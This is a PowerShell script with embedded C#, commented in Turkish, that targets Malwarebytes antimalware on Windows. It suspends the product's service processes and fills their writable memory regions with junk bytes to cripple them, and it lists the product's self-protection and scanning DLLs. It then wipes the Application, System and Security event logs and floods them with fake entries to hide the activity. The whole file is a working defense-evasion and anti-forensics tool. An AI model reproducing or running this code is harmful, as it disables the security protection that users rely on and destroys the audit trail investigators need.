# -------------------------------
# C# kodunu inline ekleme (Memory + DLL)
# -------------------------------
$source = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class ProcessHelper
{
    [DllImport("ntdll.dll")]
    public static extern uint NtSuspendProcess(IntPtr processHandle);

    [DllImport("ntdll.dll")]
    public static extern uint NtResumeProcess(IntPtr processHandle);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public UIntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_WRITECOPY = 0x08;
    const uint PAGE_EXECUTE_WRITECOPY = 0x80;

    public static void SuspendAndFillMemory(string[] targetProcesses)
    {
        byte[] data = new byte[12000];
        for(int i=0;i<data.Length;i++) data[i] = (byte)'A';

        foreach(string processName in targetProcesses)
        {
            Process[] processes = Process.GetProcessesByName(processName);
            if(processes.Length == 0)
            {
                Console.WriteLine($"Process {processName} bulunamadi.");
                continue;
            }

            Process target = processes[0];
            IntPtr hProcess = target.Handle;

            try
            {
                NtSuspendProcess(hProcess);
                Console.WriteLine($"Process {processName} durduruldu.");

                IntPtr addr = IntPtr.Zero;
                MEMORY_BASIC_INFORMATION mbi;
                while(VirtualQueryEx(hProcess, addr, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                {
                    if(mbi.State == MEM_COMMIT &&
                       (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_WRITECOPY || mbi.Protect == PAGE_EXECUTE_WRITECOPY))
                    {
                        UIntPtr bytesWritten;
                        UIntPtr sizeToWrite = (mbi.RegionSize.ToUInt64() < (ulong)data.Length) ? (UIntPtr)mbi.RegionSize : (UIntPtr)data.Length;
                        WriteProcessMemory(hProcess, mbi.BaseAddress, data, sizeToWrite, out bytesWritten);
                    }

                    addr = (IntPtr)((ulong)mbi.BaseAddress + mbi.RegionSize.ToUInt64());
                    if ((ulong)addr >= 0x7fffffffffff) break;
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine($"Hata: {ex.Message}");
            }
            finally
            {
                NtResumeProcess(hProcess);
                Console.WriteLine($"Process {processName} tekrar çalıştırıldı.");
            }
        }
    }

    public static void SuspendResumeCriticalDlls(string processName, string[] criticalDlls)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if(processes.Length == 0)
        {
            Console.WriteLine($"Process {processName} bulunamadi!");
            return;
        }

        Process target = processes[0];
        IntPtr hProcess = target.Handle;

        try
        {
            NtSuspendProcess(hProcess);
            Console.WriteLine($"Process {processName} durduruldu. Critical DLL’ler geçici olarak etkisiz.");

            foreach(ProcessModule module in target.Modules)
            {
                if(Array.Exists(criticalDlls, d => d.Equals(module.ModuleName, StringComparison.OrdinalIgnoreCase)))
                {
                    Console.WriteLine($"Critical DLL loaded: {module.ModuleName}");
                }
            }
        }
        catch(Exception ex)
        {
            Console.WriteLine($"Hata: {ex.Message}");
        }
        finally
        {
            NtResumeProcess(hProcess);
            Console.WriteLine($"Process {processName} tekrar çalıştırıldı.");
        }
    }
}
'@

# -------------------------------
# Derle
# -------------------------------
Add-Type -TypeDefinition $source -Language CSharp

# -------------------------------
# Hedef processler ve DLL listesi
# -------------------------------
$memoryTargets = @("MBAMService","MBAMWsc","MBAMPt")
$criticalDlls = @(
    "MBAMCore.dll","MBAMShim.dll","SelfProtectionSdk.dll","RtpShim.dll",
    "ScanControllerImpl.dll","AeShim.dll","Actions.dll","ArwControllerImpl.dll",
    "BrowserSDKDLL.dll","TelemetryControllerImpl.dll","UpdateControllerImpl.dll"
)
$targetProcessName = "mbam"

# -------------------------------
# Memory fill ve DLL işlemleri
# -------------------------------
[ProcessHelper]::SuspendAndFillMemory($memoryTargets)
[ProcessHelper]::SuspendResumeCriticalDlls($targetProcessName, $criticalDlls)

# -------------------------------
# Event Log temizleme ve üzerine yazma
# -------------------------------
$logs = @("Application", "System", "Security")

if (-not [System.Diagnostics.EventLog]::SourceExists("FakeSource")) {
    [System.Diagnostics.EventLog]::CreateEventSource("FakeSource", "Application")
}

foreach ($log in $logs) {
    try {
        Clear-EventLog -LogName $log
        Write-Output "$log temizlendi."
    } catch {
        Write-Output "$log temizlenemedi: $_"
    }
}

foreach ($log in $logs) {
    for ($i=0; $i -lt 300; $i++) {
        try {
            Write-EventLog -LogName $log -Source "FakeSource" -EntryType Information -EventId 1000 -Message "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        } catch {
            Write-Output "$log üzerine yazma başarısız: $_"
        }
    }
    Write-Output "$log üzerine 300 adet 'A' yazıldı."
}
